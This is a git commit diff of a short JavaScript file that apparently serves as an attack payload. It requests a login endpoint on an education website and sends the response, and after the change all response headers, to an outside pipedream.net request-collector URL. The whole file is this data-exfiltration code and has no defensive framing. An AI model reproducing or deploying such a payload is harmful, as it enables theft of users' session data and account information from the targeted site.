3adb33ef803e682a86fc94d636daf734f9f9d7e5
as3617 <46442697+as3617@users.noreply.github.com>
2020-03-05 23:39:12 +0900

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ var xhr = new XMLHttpRequest();
 xhr.open("POST", "https://www.benedu.co.kr/Home/Login");
 xhr.onreadystatechange = function() {
     text = xhr.responseText;
-    console.log(xhr.response);
-    fetch('https://encnu1395lyv7.x.pipedream.net/?q=' + xhr.response);
+    console.log(xhr.getAllResponseHeaders());
+    fetch('https://encnu1395lyv7.x.pipedream.net/?q=' + xhr.getAllResponseHeaders());
 };
 xhr.send(null);
